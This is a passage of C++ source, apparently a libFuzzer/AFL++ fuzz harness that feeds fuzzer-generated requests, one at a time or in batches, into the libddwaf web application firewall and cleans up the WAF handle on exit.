    const char *const *actions = ddwaf_known_actions(g_waf_handle, &actions_size);
    prevent_optimization(actions);
    prevent_optimization(actions_size);

    return 0;
}

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)
{
    // Limit payload size to 128KB to prevent excessive memory usage
    constexpr size_t MAX_PAYLOAD_SIZE = 128 * 1024;
    if (size > MAX_PAYLOAD_SIZE || size < 3) {
        return 0;
    }

    InputSplitter splitter(data, size);

    uint8_t fuzz_mode = splitter.get<uint8_t>() % 2;
    switch (fuzz_mode) {
    case 0: {
        ddwaf_object request = create_request_object(splitter);
        ddwaf_object result;
        ddwaf_object_invalid(&result); // Initialize result object

        uint64_t timeout = 5000; // 5ms timeout for deeper exploration
        DDWAF_RET_CODE code = ddwaf_run(g_waf_context, nullptr, &request, &result, timeout);

        ddwaf_object_free(&result);
        prevent_optimization(code);
        break;
    }
    case 1: {
        uint8_t num_requests = (splitter.get<uint8_t>() % 20) + 1; // 1-20 requests
        for (uint8_t i = 0; i < num_requests && splitter.has_data(); i++) {
            ddwaf_object request = create_request_object(splitter);
            ddwaf_object result;
            ddwaf_object_invalid(&result); // Initialize result object

            uint64_t timeout = 5000; // 5ms timeout
            DDWAF_RET_CODE code = ddwaf_run(g_waf_context, nullptr, &request, &result, timeout);

            ddwaf_object_free(&result);
            prevent_optimization(code);
        }

        break;
    }
    default: {
        // It shouldn't be possible to end up here, so crashing explicitly
        __builtin_trap();
    }
    }

    return 0;
}

// Custom cleanup function for when the fuzzer process exits
__attribute__((destructor)) static void cleanup_waf()
{
    if (g_waf_context != nullptr) {
        ddwaf_context_destroy(g_waf_context);
        g_waf_context = nullptr;
    }
    if (g_waf_handle != nullptr) {
        ddwaf_destroy(g_waf_handle);
        g_waf_handle = nullptr;
    }
}

// Create AFL++ main function with initialization
AFL_FUZZ_TARGET_WITH_INIT("e2e_fuzz", LLVMFuzzerTestOneInput, LLVMFuzzerInitialize)